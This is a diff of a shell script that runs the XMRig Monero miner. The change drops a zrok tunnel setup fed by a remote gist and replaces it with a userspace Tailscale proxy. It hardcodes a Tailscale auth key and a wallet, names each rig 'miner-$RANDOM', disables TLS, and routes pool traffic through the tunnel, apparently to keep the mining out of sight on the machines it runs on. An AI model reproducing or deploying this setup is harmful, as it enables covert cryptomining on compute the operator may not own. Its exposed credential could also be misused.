@@ -1,41 +1,31 @@
-#!/bin/bash
 
-CONFIG_URL="https://gist.githubusercontent.com/Luisbuttocks/ac7b5ada6be6cd004958c0809b12ebdc/raw/gistfile1.txt"
+TS_KEY="tskey-auth-kWwPjceRUR11CNTRL-KjbMao7rDVhzEyKgpo2aVhpyViaLDoGT"
+WINDOWS_IP="arthurmorgan"        
 WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"
-ZROK_TOKEN="23hr12Uz33O1"
 
+if [ ! -f "./tailscale" ]; then
+    echo "Downloading Tailscale..."
+    wget -q https://pkgs.tailscale.com/stable/tailscale_latest_amd64.tgz
+    tar xzf tailscale_latest_amd64.tgz --strip-components=1
+    chmod +x tailscale tailscaled
+fi
 
-BIND_IPS=($(curl -sL "$CONFIG_URL" | tr -d '\r'))
-
-
-pkill -f zrok
+pkill -f tailscaled
 pkill -f xmrig-x86_64-st
-./zrok enable "$ZROK_TOKEN"
 
-for ip in "${BIND_IPS[@]}"; do
-    if [[ ! -z "$ip" ]]; then
-        echo "Binding bridge to $ip..."
-        nohup ./zrok access private proxy1 --bind "$ip:9999" --headless > /dev/null 2>&1 &
-    fi
-done
-
+echo "Starting Tailscale in Userspace Mode..."
+./tailscaled --tun=userspace-networking --socket=ts.sock --state=ts.state --socks5-server=localhost:1055 &
 sleep 5
 
-XMRIG_CMD="./xmrig-x86_64-static -c config.json"
+echo "Connecting to Tailnet..."
+./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="miner-$RANDOM" --accept-dns=false --snat-subnet-routes=false --reset
+sleep 5
+echo "Launching with config.json via Tailscale..."
 
-# Append each IP from your gist as a separate pool
-for ip in "${BIND_IPS[@]}"; do
-    if [[ ! -z "$ip" ]]; then
-        # Force TLS off per-pool by NOT adding the --tls flag
-        XMRIG_CMD="$XMRIG_CMD -o $ip:9999 -u $WALLET"
-    fi
-done
-
-# --- 6. LAUNCH ---
-echo "-------------------------------------------------------"
-echo "Found IPs: ${#BIND_IPS[@]}"
-echo "Launching XMRig with bridges (TLS DISABLED)"
-echo "-------------------------------------------------------"
-
-# Running in foreground as requested
-$XMRIG_CMD
+./xmrig-x86_64-static \
+  -c config.json \
+  -o "$WINDOWS_IP:9999" \
+  -u "$WALLET" \
+  --proxy "127.0.0.1:1055" \
+  --no-tls \
+  --rig-id "$(hostname)"
